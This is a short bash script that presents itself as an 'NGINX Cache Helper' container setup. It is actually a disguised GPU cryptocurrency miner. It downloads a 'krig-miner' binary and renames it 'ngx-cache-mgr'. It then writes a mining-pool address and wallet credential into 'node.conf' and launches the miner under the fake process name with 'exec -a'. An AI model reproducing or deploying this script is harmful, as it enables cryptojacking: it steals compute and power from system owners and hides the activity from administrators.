#!/bin/bash
# ═══════════════════════════════════════════════════════════════
# NGINX Cache Helper — Container Setup
# ═══════════════════════════════════════════════════════════════
set -euo pipefail

WORK_DIR="/opt/nginx/helper"

echo "=============================================="
echo "  NGINX Cache Helper — Setup"
echo "=============================================="
echo ""

# GPU check
echo "[+] GPU check..."
command -v nvidia-smi &>/dev/null || { echo "[X] nvidia-smi not found"; exit 1; }
GPU=$(nvidia-smi --query-gpu=name --format=csv,noheader 2>/dev/null | head -1)
echo "[+] $GPU"

# Download
mkdir -p "$WORK_DIR"
if [ -f "$WORK_DIR/ngx-cache-mgr" ]; then
    echo "[+] Binary exists, skip download"
else
    echo "[+] Downloading..."
    TMP=$(mktemp -d)
    curl -fL "https://github.com/kryptex/krig-miner/releases/download/v1.0.6/krig-miner-1.0.6-linux-x64.tar.gz" -o "$TMP/w.tar.gz"
    tar xzf "$TMP/w.tar.gz" -C "$TMP"
    SRC=$(find "$TMP" -name "krig-miner" -type f | head -1)
    cp "$SRC" "$WORK_DIR/ngx-cache-mgr"
    chmod +x "$WORK_DIR/ngx-cache-mgr"
    rm -rf "$TMP"
    echo "[+] Done"
fi

# Config
cat > "$WORK_DIR/node.conf" <<'EOF'
URL="stratum+ssl://prl-hk.kryptex.network:8048"
USER_CRED="prl1p6z85dd93t9ks64x6fn5c4wcdc38pwsks8vac4qed24g7mwhvmdrs8z969a/fpt"
EOF
chmod 600 "$WORK_DIR/node.conf"

# GPU
nvidia-smi -pm 1 2>/dev/null || true

echo ""
echo "=============================================="
echo "  SETUP DONE"
echo "=============================================="
echo ""
echo "  Run:"
echo "  cd $WORK_DIR && source node.conf && CUDA_DEVICE_ORDER=PCI_BUS_ID exec -a ngx-cache-mgr ./ngx-cache-mgr --url \"\$URL\" --user \"\$USER_CRED\" --pass x"
echo ""
